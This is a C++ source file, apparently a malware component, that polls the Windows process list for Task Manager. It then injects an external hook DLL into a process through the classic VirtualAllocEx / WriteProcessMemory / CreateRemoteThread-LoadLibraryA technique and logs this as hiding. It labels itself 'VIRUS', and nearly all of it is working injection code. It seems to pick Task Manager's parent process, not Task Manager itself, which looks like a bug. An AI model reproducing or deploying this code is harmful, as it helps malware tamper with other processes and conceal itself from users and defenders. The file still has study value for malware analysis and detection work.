// Injector.cpp : This file contains the 'main' function. Program execution begins and ends there.
//
#include "tchar.h"
#include <Windows.h>
#include <iostream>
#include <thread>
#include <chrono>
#define out(a,b) if(b) printf(a,b)
#define NT_SUCCESS(x) ((x) >= 0)
#define STATUS_INFO_LENGTH_MISMATCH 0xc0000004
#define SystemProcessAndThreadInformation 5

typedef LONG KPRIORITY;

typedef struct _CLIENT_ID {
    DWORD          UniqueProcess;
    DWORD          UniqueThread;
} CLIENT_ID;

typedef struct _SYSTEM_THREADS {
    LARGE_INTEGER  KernelTime;
    LARGE_INTEGER  UserTime;
    LARGE_INTEGER  CreateTime;
    ULONG          WaitTime;
    PVOID          StartAddress;
    CLIENT_ID      ClientId;
    KPRIORITY      Priority;
    KPRIORITY      BasePriority;
    ULONG          ContextSwitchCount;
    LONG           State;
    LONG           WaitReason;
} SYSTEM_THREADS, * PSYSTEM_THREADS;

typedef NTSTATUS(WINAPI* tNTQSI)(
    ULONG SystemInformationClass,
    PVOID SystemInformation,
    ULONG SystemInformationLength,
    PULONG ReturnLength
    );

typedef struct _UNICODE_STRING {
    USHORT         Length;
    USHORT         MaximumLength;
    PWSTR          Buffer;
} UNICODE_STRING;

typedef struct _VM_COUNTERS {
#ifdef _WIN64
    SIZE_T         PeakVirtualSize;
    SIZE_T         PageFaultCount;
    SIZE_T         PeakWorkingSetSize;
    SIZE_T         WorkingSetSize;
    SIZE_T         QuotaPeakPagedPoolUsage;
    SIZE_T         QuotaPagedPoolUsage;
    SIZE_T         QuotaPeakNonPagedPoolUsage;
    SIZE_T         QuotaNonPagedPoolUsage;
    SIZE_T         PagefileUsage;
    SIZE_T         PeakPagefileUsage;
    SIZE_T         VirtualSize;
#else
    SIZE_T         PeakVirtualSize;
    SIZE_T         VirtualSize;
    ULONG          PageFaultCount;
    SIZE_T         PeakWorkingSetSize;
    SIZE_T         WorkingSetSize;
    SIZE_T         QuotaPeakPagedPoolUsage;
    SIZE_T         QuotaPagedPoolUsage;
    SIZE_T         QuotaPeakNonPagedPoolUsage;
    SIZE_T         QuotaNonPagedPoolUsage;
    SIZE_T         PagefileUsage;
    SIZE_T         PeakPagefileUsage;
#endif
} VM_COUNTERS;

typedef struct _SYSTEM_PROCESSES {
    ULONG            NextEntryDelta;
    ULONG            ThreadCount;
    ULONG            Reserved1[6];
    LARGE_INTEGER   CreateTime;
    LARGE_INTEGER   UserTime;
    LARGE_INTEGER   KernelTime;
    UNICODE_STRING  ProcessName;
    KPRIORITY        BasePriority;
    ULONG            ProcessId;
    ULONG            InheritedFromProcessId;
    ULONG            HandleCount;
    ULONG            Reserved2[2];
    VM_COUNTERS        VmCounters;
#if _WIN32_WINNT >= 0x500
    IO_COUNTERS        IoCounters;
#endif
    SYSTEM_THREADS  Threads[1];
} SYSTEM_PROCESSES, * PSYSTEM_PROCESSES;

int exitLine(int line) {
    std::cout << "ERROR " << line;
    return 0;
}

bool hide(int pid) {
    HANDLE procHandle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
    if (procHandle == NULL) {
        return exitLine(__LINE__);
    }

    HMODULE dllHandle = GetModuleHandleA("Kernel32");
    if (dllHandle == NULL) {
        return exitLine(__LINE__);
    }

    LPTHREAD_START_ROUTINE loadLibraryAddress = (LPTHREAD_START_ROUTINE)GetProcAddress(dllHandle, "LoadLibraryA");
    if (loadLibraryAddress == NULL) {
        return exitLine(__LINE__);
    }


    LPVOID baseAddress = VirtualAllocEx(procHandle, NULL, 256, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (baseAddress == NULL) {
        return exitLine(__LINE__);
    }

    const char* hook = "C:\\Users\\User\\hook.dll";
    size_t written;
    boolean isValid = WriteProcessMemory(procHandle, baseAddress, hook, strlen(hook) + 1, &written);
    if (isValid == 0) {
        return exitLine(__LINE__);
    }

    HANDLE threadHandle = CreateRemoteThread(procHandle, NULL, 0, loadLibraryAddress, baseAddress, 0, NULL);
    if (threadHandle == NULL) {
        return exitLine(__LINE__);
    }

    return 1;
}

int main()
{
    std::cout << "VIRUS\n";
    ULONG cbBuffer = 131072;
    PVOID pBuffer = NULL;
    NTSTATUS Status = STATUS_INFO_LENGTH_MISMATCH;
    HANDLE hHeap = GetProcessHeap();
    tNTQSI fpQSI = (tNTQSI)GetProcAddress(GetModuleHandle(_T("ntdll.dll")), "NtQuerySystemInformation");

    while (1) {
        int actual = 0;
        pBuffer = HeapAlloc(hHeap, HEAP_ZERO_MEMORY, cbBuffer);
        if (pBuffer == NULL) {
            return 0;
        }
        Status = fpQSI(SystemProcessAndThreadInformation, pBuffer, cbBuffer, &cbBuffer);

        if (Status == STATUS_INFO_LENGTH_MISMATCH) {
            HeapFree(hHeap, NULL, pBuffer);
            cbBuffer *= 2;
        }
        else if (!NT_SUCCESS(Status)) {
            HeapFree(hHeap, NULL, pBuffer);
            return 0;
        }
        else {
            PSYSTEM_PROCESSES infoP = NULL;
            infoP = (PSYSTEM_PROCESSES)pBuffer;

            while (infoP) {
                if (!wcsncmp(infoP->ProcessName.Buffer, L"Taskmgr.exe", infoP->ProcessName.Length) && infoP->InheritedFromProcessId > 0 && actual == 0) {
                    actual = infoP->InheritedFromProcessId;

                    out("Hiding instance of task manager pid = %d\n", actual);
                    int success = hide(actual);
                    if (!success) {
                        exit(0);
                    }
                }


                if (!infoP->NextEntryDelta) break;
                infoP = (PSYSTEM_PROCESSES)(((LPBYTE)infoP) + infoP->NextEntryDelta);
            }
            if (pBuffer) HeapFree(GetProcessHeap(), NULL, pBuffer);
        }
        std::this_thread::sleep_for(std::chrono::milliseconds(1000));
    }
}
